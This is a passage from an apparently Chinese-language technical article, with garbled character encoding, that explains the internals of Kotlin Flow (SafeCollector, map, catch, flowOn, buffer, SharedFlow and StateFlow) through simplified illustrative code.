<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flow</span>&lt;<span class="hljs-type">out T</span>&gt; {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">FlowCollector</span>&lt;<span class="hljs-type">in T</span>&gt; {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span>
}

<span class="hljs-comment">// Flow æ„å»ºå™¨è¿”å›çš„ SafeFlow å®ç°</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeFlow</span>&lt;<span class="hljs-type">T</span>&gt;(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> block: <span class="hljs-keyword">suspend</span> FlowCollector&lt;T&gt;.() -&gt; <span class="hljs-built_in">Unit</span>
) : Flow&lt;T&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        <span class="hljs-keyword">val</span> safeCollector = SafeCollector(collector, coroutineContext)
        <span class="hljs-keyword">try</span> {
            block(safeCollector)
        } <span class="hljs-keyword">finally</span> {
            safeCollector.releaseIntercepted()
        }
    }
}
</code></pre>
<h4 data-id="heading-25">1.2 Flow æ‰§è¡Œæ¨¡å‹</h4>
<pre><code class="hljs language-text" lang="text">Flow æ‰§è¡Œæ¨¡å‹ï¼š
  ç”Ÿäº§è€… (Producer) â†’ ä¸­é—´æ“ä½œç¬¦ (Intermediate Operators) â†’ æ¶ˆè´¹è€… (Consumer)

å®é™…è°ƒç”¨é“¾ï¼š
  collect() â†’ ä¸­é—´æ“ä½œç¬¦1.collect() â†’ ä¸­é—´æ“ä½œç¬¦2.collect() â†’ ... â†’ æºFlow.collect()
  
æ•°æ®æµå‘ï¼š
  æºFlow.emit() â†’ ä¸­é—´æ“ä½œç¬¦1.emit() â†’ ä¸­é—´æ“ä½œç¬¦2.emit() â†’ ... â†’ æ¶ˆè´¹è€…å¤„ç†
</code></pre>
<h3 data-id="heading-26">2. Flow æ„å»ºåŸç†</h3>
<h4 data-id="heading-27">2.1 flow {} æ„å»ºå™¨å®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// flow {} æ„å»ºå™¨çš„å®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">flow</span><span class="hljs-params">(
    block: <span class="hljs-type">suspend</span> <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;.() -&gt; <span class="hljs-type">Unit</span>
)</span></span>: Flow&lt;T&gt; = SafeFlow(block)

<span class="hljs-comment">// ç¤ºä¾‹ä»£ç çš„å­—èŠ‚ç è¿‘ä¼¼å®ç°</span>
flow {
    emit(<span class="hljs-number">1</span>)
    emit(<span class="hljs-number">2</span>)
}

<span class="hljs-comment">// å®é™…è¢«ç¼–è¯‘ä¸ºï¼ˆç®€åŒ–è¡¨ç¤ºï¼‰ï¼š</span>
<span class="hljs-keyword">object</span> : Flow&lt;<span class="hljs-built_in">Int</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">Int</span>&gt;)</span></span> {
        <span class="hljs-comment">// æ„å»ºå™¨lambdaè¢«ç¼–è¯‘ä¸ºä¸€ä¸ªå†…éƒ¨ç±»</span>
        collector.emit(<span class="hljs-number">1</span>)
        collector.emit(<span class="hljs-number">2</span>)
    }
}
</code></pre>
<h4 data-id="heading-28">2.2 SafeCollector çš„å…³é”®ä½œç”¨</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">actual</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeCollector</span>&lt;<span class="hljs-type">T</span>&gt; <span class="hljs-title">actual</span> <span class="hljs-keyword">constructor</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> collector: FlowCollector&lt;T&gt;,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> collectContext: CoroutineContext
) : FlowCollector&lt;T&gt;, Continuation&lt;<span class="hljs-built_in">Unit</span>&gt; {
    
    <span class="hljs-comment">// ä¿å­˜å½“å‰åç¨‹ä¸Šä¸‹æ–‡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lastEmissionContext: CoroutineContext? = <span class="hljs-literal">null</span>
    
    <span class="hljs-comment">// emit æ–¹æ³•çš„çº¿ç¨‹å®‰å…¨å®ç°</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        <span class="hljs-comment">// 1. æ£€æŸ¥åç¨‹ä¸Šä¸‹æ–‡æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼ˆé˜²æ­¢é”™è¯¯çš„çº¿ç¨‹åˆ‡æ¢ï¼‰</span>
        checkContext(currentContext)
        
        <span class="hljs-comment">// 2. ä¿å­˜å‘å°„ä¸Šä¸‹æ–‡</span>
        lastEmissionContext = currentContext
        
        <span class="hljs-comment">// 3. å®é™…å‘å°„å€¼</span>
        <span class="hljs-keyword">return</span> suspendCoroutineUninterceptedOrReturn { cont -&gt;
            <span class="hljs-comment">// ä½¿ç”¨ Continuation è¿›è¡ŒæŒ‚èµ·æ¢å¤</span>
            with(collector) {
                emit(value)
            }
            <span class="hljs-comment">// å¦‚æœæŒ‚èµ·ï¼Œè¿”å› COROUTINE_SUSPENDED</span>
            <span class="hljs-comment">// å¦åˆ™è¿”å› Unit</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">checkContext</span><span class="hljs-params">(currentContext: <span class="hljs-type">CoroutineContext</span>)</span></span> {
        <span class="hljs-comment">// ç¡®ä¿ emit è°ƒç”¨åœ¨æ­£ç¡®çš„ä¸Šä¸‹æ–‡ä¸­</span>
        <span class="hljs-keyword">if</span> (lastEmissionContext != <span class="hljs-literal">null</span> &amp;&amp; lastEmissionContext != currentContext) {
            error(<span class="hljs-string">"Flow invariant is violated"</span>)
        }
    }
}
</code></pre>
<h3 data-id="heading-29">3. æ“ä½œç¬¦å®ç°åŸç†</h3>
<h4 data-id="heading-30">3.1 ä¸­é—´æ“ä½œç¬¦ - Map å®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// map æ“ä½œç¬¦çš„å®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T, R&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">map</span><span class="hljs-params">(
    <span class="hljs-keyword">crossinline</span> transform: <span class="hljs-type">suspend</span> (<span class="hljs-type">value</span>: <span class="hljs-type">T</span>) -&gt; <span class="hljs-type">R</span>
)</span></span>: Flow&lt;R&gt; = flow {  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ Flow</span>
    collect { value -&gt;  <span class="hljs-comment">// æ”¶é›†ä¸Šæ¸¸ Flow çš„å€¼</span>
        <span class="hljs-comment">// å¯¹æ¯ä¸ªå€¼åº”ç”¨è½¬æ¢å‡½æ•°</span>
        <span class="hljs-keyword">val</span> transformed = transform(value)
        <span class="hljs-comment">// å‘ä¸‹æ¸¸å‘å°„è½¬æ¢åçš„å€¼</span>
        emit(transformed)
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹å¯¹åº”çš„è°ƒç”¨é“¾</span>
flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
    .map { it * <span class="hljs-number">2</span> }
    .collect { println(it) }

<span class="hljs-comment">// è°ƒç”¨é“¾å±•å¼€ï¼š</span>
<span class="hljs-comment">// 1. è°ƒç”¨ collect() ç»ˆç«¯æ“ä½œç¬¦</span>
<span class="hljs-comment">// 2. è§¦å‘ map åˆ›å»ºçš„ Flow çš„ collect æ–¹æ³•</span>
<span class="hljs-comment">// 3. map Flow çš„ collect æ–¹æ³•è°ƒç”¨ä¸Šæ¸¸ flowOf çš„ collect</span>
<span class="hljs-comment">// 4. flowOf å‘å°„å€¼ 1 â†’ map æ¥æ”¶å¹¶è½¬æ¢ â†’ å‘ä¸‹æ¸¸å‘å°„ 2 â†’ collect æ‰“å° 2</span>
<span class="hljs-comment">// 5. é‡å¤æ­¥éª¤4</span>
</code></pre>
<h4 data-id="heading-31">3.2 ç»ˆç«¯æ“ä½œç¬¦ - Collect å®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// collect çš„å®é™…å·¥ä½œæµç¨‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">collect</span><span class="hljs-params">(
    <span class="hljs-keyword">crossinline</span> action: <span class="hljs-type">suspend</span> (<span class="hljs-type">value</span>: <span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span>: <span class="hljs-built_in">Unit</span> = collect(<span class="hljs-keyword">object</span> : FlowCollector&lt;T&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> = action(value)
})

<span class="hljs-comment">// æ›´åº•å±‚çš„å®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
    <span class="hljs-comment">// è°ƒç”¨ Flow æ¥å£çš„ collect æ–¹æ³•</span>
    <span class="hljs-keyword">return</span> collect(collector)
}
</code></pre>
<h3 data-id="heading-32">4. å¼‚å¸¸å¤„ç†åŸç†</h3>
<h4 data-id="heading-33">4.1 catch æ“ä½œç¬¦å®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">catch</span><span class="hljs-params">(
    action: <span class="hljs-type">suspend</span> <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;.(<span class="hljs-type">cause</span>: <span class="hljs-type">Throwable</span>) -&gt; <span class="hljs-type">Unit</span>
)</span></span>: Flow&lt;T&gt; = flow {
    <span class="hljs-comment">// å¼‚å¸¸å¤„ç†é€»è¾‘</span>
    <span class="hljs-keyword">val</span> exception = catchImpl(<span class="hljs-keyword">this</span>)
    <span class="hljs-keyword">if</span> (exception != <span class="hljs-literal">null</span>) action(exception)
}

<span class="hljs-comment">// å®é™…çš„å¼‚å¸¸æ•è·å®ç°</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">catchImpl</span><span class="hljs-params">(
    collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;
)</span></span>: Throwable? {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> {
        collect(collector)
        <span class="hljs-literal">null</span>  <span class="hljs-comment">// æ­£å¸¸å®Œæˆï¼Œè¿”å› null</span>
    } <span class="hljs-keyword">catch</span> (e: Throwable) {
        <span class="hljs-comment">// åªæ•è·ä¸Šæ¸¸å¼‚å¸¸ï¼Œä¸æ•è·ä¸‹æ¸¸å¼‚å¸¸</span>
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">is</span> DownstreamExceptionElement) {
            <span class="hljs-keyword">throw</span> e  <span class="hljs-comment">// ä¸‹æ¸¸å¼‚å¸¸é‡æ–°æŠ›å‡º</span>
        }
        e  <span class="hljs-comment">// è¿”å›ä¸Šæ¸¸å¼‚å¸¸</span>
    }
}
</code></pre>
<h3 data-id="heading-34">5. ä¸Šä¸‹æ–‡åˆ‡æ¢åŸç†</h3>
<h4 data-id="heading-35">5.1 flowOn å®ç°æœºåˆ¶</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">flowOn</span><span class="hljs-params">(context: <span class="hljs-type">CoroutineContext</span>)</span></span>: Flow&lt;T&gt; {
    <span class="hljs-comment">// åˆ›å»º ChannelFlow æ¥å¤„ç†ä¸Šä¸‹æ–‡åˆ‡æ¢</span>
    <span class="hljs-keyword">return</span> ChannelFlowOperatorImpl(<span class="hljs-keyword">this</span>, context = context)
}

<span class="hljs-comment">// ChannelFlowOperatorImpl å…³é”®éƒ¨åˆ†</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChannelFlowOperatorImpl</span>&lt;<span class="hljs-type">T</span>&gt;(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> flow: Flow&lt;T&gt;,
    context: CoroutineContext
) : ChannelFlow&lt;T&gt;(context) {
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collectTo</span><span class="hljs-params">(scope: <span class="hljs-type">ProducerScope</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        <span class="hljs-comment">// åœ¨æ–°çš„åç¨‹ä¸Šä¸‹æ–‡ä¸­æ”¶é›†ä¸Šæ¸¸ Flow</span>
        coroutineScope {
            <span class="hljs-comment">// ä½¿ç”¨æ–°çš„ä¸Šä¸‹æ–‡</span>
            withContext(context) {
                flow.collect { value -&gt;
                    <span class="hljs-comment">// å°†å€¼å‘é€åˆ° channel</span>
                    scope.send(value)
                }
            }
        }
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        <span class="hljs-comment">// åˆ›å»º channel æ¥å¤„ç†èƒŒå‹</span>
        <span class="hljs-keyword">val</span> channel = produceIn(<span class="hljs-keyword">this</span>)
        <span class="hljs-comment">// ä» channel ä¸­æ¶ˆè´¹å¹¶å‘é€ç»™æ”¶é›†å™¨</span>
        channel.consumeEach { value -&gt;
            collector.emit(value)
        }
    }
}
</code></pre>
<h4 data-id="heading-36">5.2 ä¸ºä»€ä¹ˆä¸èƒ½åœ¨ flow {} ä¸­ç›´æ¥åˆ‡æ¢ä¸Šä¸‹æ–‡</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é”™è¯¯çš„åšæ³•</span>
flow {
    withContext(Dispatchers.IO) {  <span class="hljs-comment">// âŒ ä¼šç ´å Flow ä¸å˜æ€§</span>
        emit(<span class="hljs-number">1</span>)
    }
}

<span class="hljs-comment">// åŸç†ï¼šSafeCollector ä¼šæ£€æŸ¥å‘å°„ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeCollector</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> lastEmissionContext: CoroutineContext? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        <span class="hljs-keyword">val</span> currentContext = coroutineContext
        
        <span class="hljs-comment">// æ£€æŸ¥ï¼šemit è°ƒç”¨çš„ä¸Šä¸‹æ–‡å¿…é¡»ä¸€è‡´</span>
        <span class="hljs-keyword">if</span> (lastEmissionContext != <span class="hljs-literal">null</span> &amp;&amp; lastEmissionContext != currentContext) {
            <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Flow invariant is violated"</span>)
        }
        
        lastEmissionContext = currentContext
        <span class="hljs-comment">// ... å‘å°„é€»è¾‘</span>
    }
}
</code></pre>
<h3 data-id="heading-37">6. èƒŒå‹å¤„ç†åŸç†</h3>
<h4 data-id="heading-38">6.1 buffer æ“ä½œç¬¦å®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">buffer</span><span class="hljs-params">(
    capacity: <span class="hljs-type">Int</span> = Channel.BUFFERED,
    onBufferOverflow: <span class="hljs-type">BufferOverflow</span> = BufferOverflow.SUSPEND
)</span></span>: Flow&lt;T&gt; = <span class="hljs-keyword">when</span> (<span class="hljs-keyword">this</span>) {
    <span class="hljs-keyword">is</span> FusibleFlow -&gt; fuse(capacity = capacity, onBufferOverflow = onBufferOverflow)
    <span class="hljs-keyword">else</span> -&gt; ChannelFlowOperatorImpl(
        <span class="hljs-keyword">this</span>,
        capacity = capacity,
        onBufferOverflow = onBufferOverflow
    )
}

<span class="hljs-comment">// ChannelFlow çš„èƒŒå‹å¤„ç†</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChannelFlow</span>&lt;<span class="hljs-type">T</span>&gt;(
    <span class="hljs-keyword">val</span> capacity: <span class="hljs-built_in">Int</span> = Channel.BUFFERED,
    <span class="hljs-keyword">val</span> onBufferOverflow: BufferOverflow = BufferOverflow.SUSPEND
) : Flow&lt;T&gt; {
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        <span class="hljs-comment">// åˆ›å»ºå…·æœ‰ç¼“å†²èƒ½åŠ›çš„ channel</span>
        <span class="hljs-keyword">val</span> channel = Channel&lt;T&gt;(capacity, onBufferOverflow)
        
        <span class="hljs-comment">// å¯åŠ¨ç”Ÿäº§è€…åç¨‹</span>
        <span class="hljs-keyword">val</span> producer = launchProducer(channel)
        
        <span class="hljs-comment">// æ¶ˆè´¹è€…ä» channel æ¥æ”¶</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">for</span> (value <span class="hljs-keyword">in</span> channel) {
                collector.emit(value)
            }
        } <span class="hljs-keyword">finally</span> {
            producer.cancel()
        }
    }
}
</code></pre>
<h4 data-id="heading-39">6.2 conflate æ“ä½œç¬¦å®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Flow<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">conflate</span><span class="hljs-params">()</span></span>: Flow&lt;T&gt; = buffer(
    capacity = Channel.CONFLATED,
    onBufferOverflow = BufferOverflow.DROP_OLDEST
)

<span class="hljs-comment">// CONFLATED çš„ç‰¹æ®Šå¤„ç†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CONFLATED: <span class="hljs-built_in">Int</span> = -<span class="hljs-number">1</span>

<span class="hljs-comment">// Channel å®ç°ä¸­çš„ CONFLATED å¤„ç†</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConflatedChannel</span>&lt;<span class="hljs-type">E</span>&gt; : <span class="hljs-type">AbstractChannel</span>&lt;<span class="hljs-type">E</span>&gt;() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> value: Any? = NULL
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">send</span><span class="hljs-params">(element: <span class="hljs-type">E</span>)</span></span> {
        <span class="hljs-comment">// å¦‚æœæœ‰æœªæ¶ˆè´¹çš„å€¼ï¼Œç›´æ¥æ›¿æ¢</span>
        <span class="hljs-keyword">if</span> (value !== NULL) {
            value = element
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å¦åˆ™æ­£å¸¸å‘é€</span>
            <span class="hljs-keyword">super</span>.send(element)
        }
    }
}
</code></pre>
<h3 data-id="heading-40">7. SharedFlow åŸç†</h3>
<h4 data-id="heading-41">7.1 MutableSharedFlow æ ¸å¿ƒå®ç°</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">MutableSharedFlow</span><span class="hljs-params">(
    replay: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>,
    extraBufferCapacity: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>,
    onBufferOverflow: <span class="hljs-type">BufferOverflow</span> = BufferOverflow.SUSPEND
)</span></span>: MutableSharedFlow&lt;T&gt; {
    <span class="hljs-keyword">return</span> SharedFlowImpl(replay, extraBufferCapacity, onBufferOverflow)
}

<span class="hljs-comment">// SharedFlowImpl çš„å…³é”®æ•°æ®ç»“æ„</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedFlowImpl</span>&lt;<span class="hljs-type">T</span>&gt;(
    replay: <span class="hljs-built_in">Int</span>,
    bufferCapacity: <span class="hljs-built_in">Int</span>,
    onBufferOverflow: BufferOverflow
) : AbstractSharedFlow&lt;SharedFlowSlot&lt;T&gt;&gt;(), MutableSharedFlow&lt;T&gt; {
    
    <span class="hljs-comment">// ç¼“å†²åŒºæ•°ç»„ï¼ˆç¯å½¢ç¼“å†²åŒºï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> buffer: Array&lt;Any?&gt;? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> replayIndex = <span class="hljs-number">0L</span>   <span class="hljs-comment">// é‡æ”¾èµ·å§‹ç´¢å¼•</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> minCollectorIndex = <span class="hljs-number">0L</span>  <span class="hljs-comment">// æœ€å°æ”¶é›†è€…ç´¢å¼•</span>
    
    <span class="hljs-comment">// å‘å°„å€¼</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        <span class="hljs-comment">// å°è¯•å¿«é€Ÿå‘å°„ï¼ˆæ— ç­‰å¾…ï¼‰</span>
        <span class="hljs-keyword">if</span> (tryEmit(value)) <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment">// éœ€è¦æŒ‚èµ·ç­‰å¾…</span>
        emitSuspend(value)
    }
    
    <span class="hljs-comment">// æ”¶é›†å€¼</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">collect</span><span class="hljs-params">(collector: <span class="hljs-type">FlowCollector</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        <span class="hljs-comment">// ä¸ºæ”¶é›†è€…åˆ†é…ä¸€ä¸ªæ§½</span>
        <span class="hljs-keyword">val</span> slot = allocateSlot()
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ”¶é›†å¾ªç¯</span>
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-comment">// å°è¯•ä»ç¼“å†²åŒºè·å–å€¼</span>
                <span class="hljs-keyword">val</span> value = slot.takeValue() ?: suspendAndWait()
                collector.emit(value <span class="hljs-keyword">as</span> T)
            }
        } <span class="hljs-keyword">finally</span> {
            freeSlot(slot)
        }
    }
}
</code></pre>
<h4 data-id="heading-42">7.2 SharedFlow çš„è®¢é˜…ç®¡ç†</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SharedFlow çš„è®¢é˜…è€…ç®¡ç†</span>
<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractSharedFlow</span>&lt;<span class="hljs-type">S : AbstractSharedFlowSlot&lt;*</span>&gt;&gt; {
    
    <span class="hljs-comment">// æ‰€æœ‰æ´»è·ƒçš„è®¢é˜…è€…æ§½</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> slots: Array&lt;S?&gt;? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> nCollectors = <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// åˆ†é…æ§½ç»™æ–°çš„æ”¶é›†è€…</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">allocateSlot</span><span class="hljs-params">()</span></span>: S {
        <span class="hljs-keyword">val</span> slot = createSlot()
        synchronized(<span class="hljs-keyword">this</span>) {
            slots = slots.orEmpty().plus(slot)
            nCollectors++
            onNewCollector(slot)
        }
        <span class="hljs-keyword">return</span> slot
    }
    
    <span class="hljs-comment">// é‡Šæ”¾æ§½</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">freeSlot</span><span class="hljs-params">(slot: <span class="hljs-type">S</span>)</span></span> {
        synchronized(<span class="hljs-keyword">this</span>) {
            slots = slots.orEmpty().filter { it !== slot }.toTypedArray()
            nCollectors--
        }
    }
}
</code></pre>
<h3 data-id="heading-43">8. StateFlow åŸç†</h3>
<h4 data-id="heading-44">8.1 StateFlow çš„ç‰¹æ®Šæ€§</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StateFlow</span>&lt;<span class="hljs-type">out T</span>&gt; : <span class="hljs-type">SharedFlow</span>&lt;<span class="hljs-type">T</span>&gt; {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> value: T
}

<span class="hljs-comment">// StateFlowImpl å®ç°</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StateFlowImpl</span>&lt;<span class="hljs-type">T</span>&gt;(
    initialState: T
) : AbstractSharedFlow&lt;StateFlowSlot&gt;(), StateFlow&lt;T&gt;, MutableStateFlow&lt;T&gt; {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _state: Any = initialState
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> sequence = <span class="hljs-number">0L</span>  <span class="hljs-comment">// åºåˆ—å·ï¼Œç”¨äºæ£€æµ‹é‡å¤å€¼</span>
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> value: T
        <span class="hljs-keyword">get</span>() = _state <span class="hljs-keyword">as</span> T
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">emit</span><span class="hljs-params">(value: <span class="hljs-type">T</span>)</span></span> {
        <span class="hljs-comment">// å¦‚æœå€¼ä¸å½“å‰çŠ¶æ€ç›¸åŒï¼Œåˆ™å¿½ç•¥</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.value == value &amp;&amp; sequence != <span class="hljs-number">0L</span>) <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment">// æ›´æ–°çŠ¶æ€</span>
        _state = value
        sequence++
        
        <span class="hljs-comment">// é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…</span>
        forEachSlot { slot -&gt;
            slot.makePending()
        }
    }
}
</code></pre>
<h3 data-id="heading-45">9. Flow çš„åç¨‹é›†æˆ</h3>
<h4 data-id="heading-46">9.1 Flow ä¸åç¨‹ Continuation</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Flow æ”¶é›†çš„åç¨‹ Continuation è½¬æ¢</span>
